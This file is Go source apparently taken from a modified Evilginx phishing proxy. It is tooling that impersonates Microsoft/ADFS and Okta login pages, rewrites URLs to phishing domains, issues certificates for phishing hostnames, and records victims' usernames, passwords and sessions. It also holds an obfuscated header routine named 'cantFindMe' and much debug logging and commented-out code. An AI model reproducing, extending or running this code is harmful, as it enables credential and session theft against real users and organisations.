//	//if strings.Contains(hostnameRN, "adfs") {
//	//	parts := strings.Split(strings.ToLower(u.Host), ".")
//	//	domain = parts[len(parts)-2] + "." + parts[len(parts)-1]
//	//	subdomain = parts[len(parts)-3]
//	//}
//
//	//log.Warning("READ URL AWAL: %s", read_url)
//
//	//log.Warning("subdomain AWAL: %s", subdomain)
//	//log.Warning("domain AWAL: %s", domain)
//	//log.Warning("patchUrls re_ns_url: %s", re_ns_url)
//
//	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
//
//		log.Warning("patchUrls INSIDE IF: phishDomain: %s", phishDomain)
//		var sub_map map[string]string = make(map[string]string)
//		var hosts []string
//
//		for _, ph := range pl.proxyHosts {
//			fmt.Println()
//			log.Warning("patchUrls ph: %s", ph)
//			var h string
//			if c_type == CONVERT_TO_ORIGINAL_URLS {
//				log.Warning("patchUrls CONVERT_TO_ORIGINAL_URLS: %s", true)
//				h = combineHost(ph.phish_subdomain, phishDomain)
//				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
//			} else {
//				log.Warning("patchUrls CONVERT_TO_ORIGINAL_URLS: %s", false)
//				h = combineHost(ph.orig_subdomain, ph.domain)
//				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
//			}
//			hosts = append(hosts, h)
//			log.Warning("patchUrls hosts: %s", hosts)
//			fmt.Println()
//		}
//		log.Warning("sub_map: %s", sub_map)
//		// make sure that we start replacing strings from longest to shortest
//		sort.Slice(hosts, func(i, j int) bool {
//			return len(hosts[i]) > len(hosts[j])
//		})
//
//		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
//			//added := false
//			u, err := url.Parse(s_url)
//			//added := false
//			//added2 := false
//			//var domain string
//			//var subdomain string
//			//if strings.Contains(strings.ToLower(u.Host), "adfs") {
//			//	parts := strings.Split(strings.ToLower(u.Host), ".")
//			//	domain = parts[len(parts)-2] + "." + parts[len(parts)-1]
//			//	log.Warning("domain inside body: %s", domain)
//			//	subdomain = parts[len(parts)-3]
//			//	log.Warning("subdomain inside body: %s", subdomain)
//			//
//			//}
//
//			//if strings.Contains(strings.ToLower(u.Host), "okta.com") {
//			//	parts := strings.Split(strings.ToLower(u.Host), ".")
//			//	domain = parts[len(parts)-2] + "." + parts[len(parts)-1]
//			//	log.Warning("domain inside body: %s", domain)
//			//	subdomain = parts[len(parts)-3]
//			//	log.Warning("subdomain inside body: %s", subdomain)
//			//
//			//	data := ProxyHost{
//			//		phish_subdomain: subdomain,
//			//		domain:          domain,
//			//		orig_subdomain:  subdomain,
//			//		is_landing:      false,
//			//		handle_session:  true,
//			//		auto_filter:     true,
//			//	}
//			//
//			//	pl.proxyHosts = append(pl.proxyHosts, data)
//			//	sub_map[combineHost(subdomain, domain)] = "pointb.fuck.com"
//			//
//			//}
//
//			if err == nil {
//
//				//if strings.Contains(strings.ToLower(u.Host), "adfs") {
//				//
//				//	for _, ph := range pl.proxyHosts {
//				//
//				//		if !added {
//				//			log.Warning("ADDING PROXY HOST IN PATCHSURL")
//				//			//domain2 := "okta.com"
//				//			ph.domain = domain
//				//
//				//			ph.orig_subdomain = subdomain
//				//			ph.phish_subdomain = subdomain
//				//			ph.auto_filter = true
//				//			ph.is_landing = false
//				//			ph.handle_session = true
//				//			pl.proxyHosts = append(pl.proxyHosts, ph)
//				//			hosts = append(hosts, combineHost(ph.phish_subdomain, domain))
//				//			sub_map[combineHost(ph.phish_subdomain, ph.domain)] = "adfs.fuck.com"
//				//			added = true
//				//		}
//				//	}
//				//}
//
//				log.Warning("PL PROXYHOST IN PATCHSURL: %s", pl.proxyHosts)
//				log.Warning("SUBMAP IN PATCHSURL: %s", sub_map)
//
//				for _, h := range hosts {
//
//					log.Warning("[ReplaceAllStringFunc] U.HOST :%s >> h :%s", strings.ToLower(u.Host), h)
//
//					if strings.ToLower(u.Host) == h {
//						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
//						log.Warning("HOST SAME CORRECTTO: for %s AND %s", strings.ToLower(u.Host), s_url)
//						break
//					} else {
//						log.Error("HOST NOT SAME")
//					}
//				}
//			}
//			log.Warning("patchUrls s_url: %s", s_url)
//			return s_url
//		}))
//		//log.Warning("patchUrls: body: %s", body)
//
//		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
//			log.Warning("ENTER replaceAllStringFunc")
//			log.Warning("hosts lenght : %d", len(hosts))
//			for index, h := range hosts {
//				log.Warning("index: %d", index)
//				log.Warning("APAKAH S_URL: %s TERDAPAT hosts: %s", s_url, h)
//				log.Warning("APAKAH S_URL: %s TIDAK TERDAPAT SUB_MAP: %s", s_url, sub_map[h])
//
//				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
//					log.Warning("PATCHSURL RETURN TRUE")
//					s_url = strings.Replace(s_url, h, sub_map[h], 1)
//					break
//				} else {
//					log.Error("KEDUANYA TIDAK")
//				}
//
//				fmt.Println()
//			}
//
//			log.Warning("patchUrls END RETURN s_url : %s", s_url)
//			return s_url
//		}))
//		//log.Warning("patchUrls: body: %s", body)
//	}
//
//	log.Error("END PATCHURLS")
//	//log.Warning("BODY : %s", body)
//	return body
//}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	log.Warning("ENTER PATCHURLS")
	log.Warning("IsAdded: %t", p.isAdded)
	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
	pishdomain := ""
	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		pishdomain = phishDomain
		log.Warning("PHISHDOMAIN: %s", phishDomain)
		var sub_map map[string]string = make(map[string]string)
		var hosts []string

		// COMMENTED FOR NON OFFICE
		log.Warning("proxy_hosts: ", pl.proxyHosts)

		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}

		//END FOR COMMENTED

		// make sure that we start replacing strings from longest to shortest

		// THIS IS FOR OFFICE

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			//log.Warning("body: %s", body)
			log.Warning("s_url: %s", s_url)
			//data := s_url
			log.Warning("u HOST: %s", strings.ToLower(u.Host))
			myString := string(body[:])

			if strings.Contains(myString, "FederationRedirectUrl") && !strings.Contains(myString, "<script type=\"text/javascript\">") {
				//log.Warning(myString)
				log.Warning("FederationRedirectUrl")
				//os.Exit(0)

				if strings.Contains(myString, strings.ToLower(u.Host)) {
					subdomain := ""
					//if p.isAdded == false {
					//log.Warning("ENTERED COMPANY PAGE")
					//log.Warning("URL ACCESS NOW : %s", strings.ToLower(u.Host))
					parts := strings.Split(strings.ToLower(u.Host), ".")
					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]

					//log.Warning("domain inside body: %s", domain)
					if len(parts) > 2 {
						subdomain = parts[len(parts)-3]
						fmt.Println(subdomain)

					}
					//log.Warning("subdomain inside body: %s", subdomain)

					data := ProxyHost{
						phish_subdomain: subdomain,
						domain:          domain,
						orig_subdomain:  subdomain,
						is_landing:      false,
						handle_session:  true,
						auto_filter:     true,
					}
					log.Warning("data: %s", data)
					pl.proxyHosts = append(pl.proxyHosts, data)
					hosts = append(hosts, combineHost(subdomain, domain))
					log.Warning("checking")
					log.Warning(subdomain + "." + pishdomain)
					log.Warning("hosts: ", hosts)
					if len(subdomain) != 0 {
						sub_map[combineHost(subdomain, domain)] = subdomain + "." + pishdomain
					} else {
						sub_map[combineHost(subdomain, domain)] = pishdomain
					}

					p.isAdded = true
					//log.Warning("isAdded: %t", p.isAdded)
					//}
				}
				//fmt.Println(objmap[0]["FederationRedirectUrl"])
			}

			sort.Slice(hosts, func(i, j int) bool {
				return len(hosts[i]) > len(hosts[j])
			})
			log.Warning("SUBMAP IN PATCHSURL: %s", sub_map)
			log.Warning("HOSTS IN PATCHSURL: %s", hosts)
			log.Warning("SUBFILTER IN PATCHSURL: %s", pl.subfilters)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))

		// END THIS IS FOR OFFICE

		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		log.Warning("HOST TLSCONFIG: %s", host)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		if !p.developer {
			// check for lure hostname
			cert, err := p.crt_db.GetHostnameCertificate(hostname)
			if err != nil {
				// check for phishlet hostname
				pl := p.getPhishletByOrigHost(hostname)
				if pl != nil {
					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
					if ok {
						cert, err = p.crt_db.GetPhishletCertificate(pl.Name, phishDomain)
						if err != nil {
							return nil, err
						}
					}
				}
			}
			if cert != nil {
				return &tls.Config{
					InsecureSkipVerify: true,
					Certificates:       []tls.Certificate{*cert},
				}, nil
			}
			log.Debug("no SSL/TLS certificate for host '%s'", host)
			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
			if err != nil {
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}
	log.Important("EVILGINX STARTED")
	log.Important("starting https proxy on %s:%d", p.cfg.activeHostnames, p.cfg.proxyPort)
	p.isRunning = true
	p.isAdded = false
	p.isAdded2 = false
	log.Warning("IsRunning: %v", p.isRunning)
	log.Warning("IsAdded: %v", p.isAdded)
	log.Warning("IsAdded2: %v", p.isAdded2)
	for p.isRunning {
		log.Warning("IsRunning: %v", p.isRunning)
		log.Important("waiting for https connection")
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				log.Warning("Nothince")
				return
			}
			log.Warning("TLS connection from %s", tlsConn.RemoteAddr())
			log.Warning("TLS connection from %s", tlsConn.LocalAddr())
			log.Warning("TLSCONN: %s", tlsConn)
			hostname := tlsConn.Host()

			if hostname == "" {
				return
			}
			log.Info("hostname from TLSCONN: %s", hostname)
			if !p.cfg.IsActiveHostname(hostname) {
				log.Error("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)
			log.Info("Oroginal Host is : %s", hostname)
			log.Warning("HOSTNAME HTTPSWORKER: %s", hostname)
			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			fmt.Printf("\n [httpsWorker] resp : %s\n", resp)
			fmt.Printf("\n [httpsWorker] req : %s\n", req)
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	log.Warning("replaceHostWithOriginal Awal: %s", hostname)
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	log.Warning("replaceHostWithOriginal AFTER IF: %s", hostname)
	//p.cfg.IsSiteEnabled()

	//parts := strings.Split(hostname, ".")
	//domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
	//subdomain := parts[len(parts)-3]
	//log.Warning("subdomain: %s", subdomain)
	//log.Warning("domain: %s", domain)
	//p.cfg.phishlets.addDomain(domain)
	//adding := false
	for site, pl := range p.cfg.phishlets {
		//log.Warning("Site : %s", site)
		//if strings.Contains(hostname, "fuck.com") {
		//
		//}
		if p.cfg.IsSiteEnabled(site) {

			log.Warning("SITEENABLE CONDITION TRUE")
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			log.Warning("[replaceHostWithOriginal] phishDomain : %s", phishDomain)
			log.Warning("[replaceHostWithOriginal] ok : %s", ok)
			if !ok {
				continue
			}

			for _, ph := range pl.proxyHosts {

				log.Warning("[replaceHostWithOriginal] HOSTNAME: %s >> COMBINEHOST: %s", hostname, combineHost(ph.phish_subdomain, phishDomain))
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					log.Warning("replaceHostWithOriginal Final: %s", combineHost(ph.orig_subdomain, ph.domain))

					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				} else {
					log.Warning("replaceHostWithOriginal ELSE: %s", hostname)
					//if subdomain == "pointb" {
					//if !adding {
					//	log.Warning("ADDING PROXY HOST IN replaceHostWithOriginal")
					//	domain2 := "okta.com"
					//	ph.domain = domain2
					//
					//	ph.orig_subdomain = subdomain
					//	ph.phish_subdomain = subdomain
					//	ph.auto_filter = true
					//	ph.is_landing = false
					//	ph.handle_session = true
					//	pl.proxyHosts = append(pl.proxyHosts, ph)
					//
					//	//for _, filters := range pl.subfilters {
					//	//data :=	SubFilter{
					//	//	domain:    ph.domain,
					//	//	subdomain: ph.orig_subdomain,
					//	//}
					//	var names = []string{"text/html", "application/javascript", "application/json"}
					//	var with_params = []string{"EMAIL"}
					//	//with_params[0] = "EMAIL"
					//	//names[0] = "text/html"
					//	//names[2] = "application/javascript"
					//	//names[3] = "application/json"
					//
					//	//pl.addSubFilter(combineHost(ph.orig_subdomain, ph.domain), ph.orig_subdomain, ph.domain, names, "sha384-.{64}", "https://{hostname}", true, with_params)
					//	//
					//	//for _, ps := range pl.subf {
					//	//
					//	//}
					//
					//	data := SubFilter{subdomain: ph.orig_subdomain, domain: ph.domain, mime: names, regexp: "sha384-.{64}", replace: "https://{hostname}", redirect_only: true, with_params: with_params}
					//	pl.subfilters[combineHost(ph.orig_subdomain, ph.domain)] = append(pl.subfilters[combineHost(ph.orig_subdomain, ph.domain)], data)
					//
					//	//}
					//	log.Warning("SUBFILTERS: %s", pl.subfilters)
					//	adding = true
					//	//}
					//
					//}
					//pl.addProxyHost(subdomain, subdomain, domain, true, false, true)
				}
			}
		} else {
			log.Warning("SITEENABLE CONDITION FALSE")
		}
	}
	log.Warning("replaceHostWithOriginal Final: %s AND FALSE", hostname)
	return hostname, false
}

func checkingSomething(hostname string, pl *Phishlet) bool {

	for _, ph := range pl.proxyHosts {

		if hostname == ph.domain {
			return false

		}

		if strings.Contains(hostname, "company-abosolute.online") {
			return false
		}

		if hostname == ph.domain {
			return false

		}
		if hostname == combineHost(ph.orig_subdomain, ph.domain) {
			return false
		}

	}
	log.Warning("returning true")
	return true
	//return false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	log.Warning("replaceHostWithPhished Awal: %s", hostname)

	//log.Warning(hostname)
	if hostname == "" {
		log.Warning("HOSTNAME KOSONG")
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	log.Warning("HOSTNAME replaceHostWithPhished AFTER IF: %s", hostname)
	//addes := false
	//log.Warning(hostname)

	for site, pl := range p.cfg.phishlets {

		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			log.Warning("PHISHDOMAIN %s", phishDomain)
			if !ok {
				log.Warning("NOT OKK")
				continue
			}
			// MICROSOFT
			//|| strings.Contains(ph.domain, hostname)

			for _, ph := range pl.proxyHosts {
				if strings.Contains(hostname, ph.domain) {
					log.Info("hostname and ph.domain")
					log.Info(hostname, ph.domain)

					if hostname == ph.domain {
						continue
					}
					if hostname == combineHost(ph.orig_subdomain, ph.domain) {
						continue
					}
					if strings.Contains(hostname, ".online") {
						continue
					}
					if strings.Contains(hostname, ".bio") {
						continue
					}
					if strings.Contains(hostname, "fuck.com") {
						continue
					}

					//for _, element := range pl.proxyHosts {
					//	log.Warning("cek apakah sudah ada")
					//	log.Warning(combineHost(element.orig_subdomain, element.domain))
					//	log.Warning(strings.ToLower(hostname)
					//	if combineHost(element.orig_subdomain, element.domain) == hostname {
					//		log.Warning("ada")
					//		//exists = true
					//
					//	} else {
					//
					//		log.Warning("Belum ada hostname di host ")
					//		parts := strings.Split(strings.ToLower(hostname), ".")
					//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
					//		log.Warning("domain inside replaceHostWithPhished: %s", domain)
					//		subdomain := parts[len(parts)-3]
					//		log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
					//		data := ProxyHost{
					//			phish_subdomain: subdomain,
					//			domain:          domain,
					//			orig_subdomain:  subdomain,
					//			is_landing:      false,
					//			handle_session:  true,
					//			auto_filter:     true,
					//		}
					//		//		log.Warning("data: %s", data)
					//		pl.proxyHosts = append(pl.proxyHosts, data)
					//		log.Warning("Added New Host: ", pl.proxyHosts)
					//
					//	}
					//}

					exists := false
					for _, element := range pl.proxyHosts {
						log.Warning("cek apakah sudah ada")
						log.Warning(combineHost(element.orig_subdomain, element.domain), hostname)
						if combineHost(element.orig_subdomain, element.domain) == hostname {
							exists = true
							break
						}
					}

					if exists {
						log.Warning("sudah ada")
					}

					if !exists {
						log.Warning("Belum ada hostname di host ")
						parts := strings.Split(strings.ToLower(hostname), ".")
						domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
						log.Warning("domain inside replaceHostWithPhished: %s", domain)
						subdomain := parts[len(parts)-3]
						log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
						data := ProxyHost{
							phish_subdomain: subdomain,
							domain:          domain,
							orig_subdomain:  subdomain,
							is_landing:      false,
							handle_session:  true,
							auto_filter:     true,
						}
						//		log.Warning("data: %s", data)
						pl.proxyHosts = append(pl.proxyHosts, data)
						log.Warning("Added value\n: ", pl.proxyHosts)

					} else {
						log.Warning("Sudah ada hostname di host ")
					}

				}
			}

			for _, ph := range pl.proxyHosts {

				log.Warning("HOSTNAME: %s Domain %s", hostname, ph.domain)
				if hostname == ph.domain {
					log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
					log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
					return prefix + phishDomain, true
				}
				log.Warning("[IF] HOSTNAME: %s CombineHost %s", hostname, combineHost(ph.orig_subdomain, ph.domain))
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
					//log.Warning(combineHost(ph.phish_subdomain, phishDomain))
					log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}

			}

		}

	}
	log.Warning("replaceHostWithPhished: %s AND condition : %b", hostname, false)
	return hostname, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	log.Warning("Inside getPhishDomain AWAL , hostname : %s", hostname)
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					log.Important("getPhishDomain: %s AND TRUE ", phishDomain)
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					if ph.handle_session || ph.is_landing {
						return true
					}
					return false
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	log.Important("HTTPPROXY START")
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
	if cookie := req.Header.Get("Cookie"); cookie != "" {
		re := regexp.MustCompile(`(` + name + `=[^;]*;?\s*)`)
		new_cookie := re.ReplaceAllString(cookie, "")
		req.Header.Set("Cookie", new_cookie)
	}
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	//log.Debug("isWhitelistIP: %s", ip_addr)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	sid, ok := p.ip_sids[ip_addr]
	return sid, ok
}

func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
	var b []byte = []byte("\x1dh\x003,)\",+=")
	for n, c := range b {
		b[n] = c ^ 0x45
	}
	log.Warning("cantFindMe: %s %s", req.RemoteAddr, nothing_to_see_here)
	req.Header.Set(string(b), nothing_to_see_here)
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}

		/*
			var auth *proxy.Auth = nil
			if len(username) > 0 {
				auth.User = username
				auth.Password = password
			}

			proxy_addr := address + ":" + strconv.Itoa(port)

			socks5, err := proxy.SOCKS5("tcp", proxy_addr, auth, proxy.Direct)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = socks5.Dial
		*/
	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}
